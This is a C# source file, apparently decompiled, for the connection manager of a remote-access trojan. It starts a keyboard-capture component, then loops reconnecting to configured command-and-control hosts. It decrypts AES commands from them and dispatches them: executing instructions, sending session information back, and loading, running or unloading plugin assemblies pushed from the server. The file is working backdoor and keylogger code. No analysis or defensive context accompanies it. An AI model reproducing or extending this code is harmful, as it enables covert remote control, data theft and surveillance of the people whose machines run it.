using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Messages;
using Models;
using algorithm;
using newClient.Comms.TCP;
using newClient.Comms.UDP;
using newClient.Utilities;
using newClient.keyboard;

namespace newClient.Comms;

public class SocketManger
{
	public static int ModuleSleep = 20000;

	public static ISocketModule SocketModule;

	private static Queue<string> hostsqueue = new Queue<string>();

	public static keyboardManagaers kkeyboardManagaers = new keyboardManagaers();

	public static void Run()
	{
		kkeyboardManagaers.Run();
		Logger.Info("kkeyboardManagaers");
		while (true)
		{
			try
			{
				CreateSocketModule();
				Logger.Info("CreateSocketModule");
				while (SocketModule != null && SocketModule.Connected)
				{
					if (SocketModule.ConsumerChannel.TryDequeue(out var item))
					{
						OnProcessorMsg(item);
					}
				}
			}
			catch (Exception)
			{
			}
			Thread.Sleep(ModuleSleep);
		}
	}

	private static void getHostQueueConfig(out string host, out string port)
	{
		Queue<string> queue = hostsqueue;
		if (queue != null && queue.Count == 0)
		{
			hostsqueue = new Queue<string>(config.host.Split(new char[1] { ';' }));
		}
		object obj = hostsqueue?.Dequeue()?.Split(new char[1] { ':' });
		string[] array = (string[])obj;
		host = ((array != null) ? array[0] : null);
		port = ((array != null) ? array[1] : null);
	}

	private static void CreateSocketModule()
	{
		if (SocketModule == null || !SocketModule.Connected)
		{
			getHostQueueConfig(out var host, out var port);
			switch (config.PProType)
			{
			case ProType.TCP:
				SocketModule = new TcpServer();
				break;
			case ProType.UDP:
				SocketModule = new RTPUDP();
				break;
			}
			SocketModule.socketConnect(host, int.Parse(port));
		}
	}

	public static void OnProcessorMsg(byte[] msg)
	{
		try
		{
			msg = SocketModule.aesManaged.AesDecrypt(msg);
			switch (msg[0])
			{
			case 80:
				InstructionHelper.Exec(msg.Skip(1).ToArray());
				break;
			case 91:
				Logger.Info("clientinfo");
				clientinfoProcessor();
				break;
			case 86:
				AssemblyLoader.AddAndLoadAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
				break;
			case 87:
				AssemblyLoader.ExecAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
				break;
			case 88:
				AssemblyLoader.UnloadAssamebly(Serializable.Deserialize(GZip.Decompress(msg.Skip(1).ToArray())) as pluginMessages);
				break;
			case 89:
				AssemblyLoader.UnloadClientIDpulgin(msg.Skip(1).ToArray());
				break;
			}
		}
		catch (Exception ex)
		{
			Logger.Info(ex.Message + "\r\n" + ex.StackTrace);
		}
	}

	public static void clientinfoProcessor()
	{
		config.session.ProtocolType = Enum.GetName(typeof(ProType), SocketModule.ProtocolType);
		List<byte> list = new List<byte>();
		list.AddRange(BitConverter.GetBytes(91));
		list.AddRange(GZip.Compress(Serializable.SerialiseData(config.session)));
		SocketMangerSendMessage(list.ToArray(), 0);
	}

	public static int SocketMangerSendMessage(byte[] message, byte type = 0, int ClientID = 0)
	{
		if (message == null || message.Length == 0 || SocketModule == null || !SocketModule.Connected)
		{
			return -1;
		}
		List<byte> list = new List<byte>();
		if (ClientID != 0)
		{
			list.AddRange(BitConverter.GetBytes(ClientID));
		}
		if (type != 0)
		{
			list.Add(type);
		}
		list.AddRange(message);
		return SocketModule.socketSend(SocketModule.aesManaged.AesEncrypt(list.ToArray()));
	}
}
